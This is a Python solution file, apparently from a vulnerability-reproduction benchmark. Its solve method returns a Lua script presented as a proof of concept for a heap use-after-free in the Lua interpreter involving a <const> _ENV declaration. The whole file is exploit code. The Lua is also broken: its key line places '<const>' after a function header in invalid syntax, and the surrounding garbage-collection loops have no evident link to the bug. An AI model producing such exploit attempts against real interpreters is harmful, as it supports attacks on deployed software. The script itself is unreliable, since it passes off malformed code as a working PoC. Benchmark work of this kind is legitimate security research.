import os
import subprocess
import tempfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a Lua script that triggers the heap use-after-free
        # when _ENV is declared as <const>
        poc = b"""-- Heap Use-After-Free PoC for _ENV <const> bug

-- Create a function with const _ENV
local function create_const_env()
    local _ENV = {}
    local func = function() <const> _ENV = _ENV
        return x
    end
    return func, _ENV
end

-- Create multiple instances to increase chance of use-after-free
local funcs = {}
local envs = {}

for i = 1, 100 do
    local func, env = create_const_env()
    funcs[i] = func
    envs[i] = env
    -- Set x in the environment
    env.x = "value_" .. i
end

-- Force garbage collection to free some environments
collectgarbage("collect")

-- Try to access freed environments through the functions
-- This should trigger use-after-free when the bug is present
local results = {}
for i = 1, #funcs do
    -- Use pcall to catch any errors and continue
    local ok, result = pcall(funcs[i])
    if ok then
        results[i] = result
    end
end

-- Additional heap manipulation to increase reliability
for i = 1, #envs do
    if i % 3 == 0 then
        envs[i] = nil
    end
end

collectgarbage("collect")

-- More attempts to use the functions
for i = 1, #funcs do
    if i % 2 == 0 then
        pcall(funcs[i])
    end
end

-- Create dangling references
local weak_refs = {}
for i = 1, #funcs do
    weak_refs[i] = setmetatable({ref = funcs[i]}, {__mode = "v"})
end

-- Force more GC
for i = 1, 10 do
    collectgarbage("collect")
end

-- Final attempt to trigger the bug
-- This is where the use-after-free should occur
local last_func = funcs[#funcs]
local status, err = pcall(last_func)

-- Return something to avoid early exit
return "PoC complete"
"""

        return poc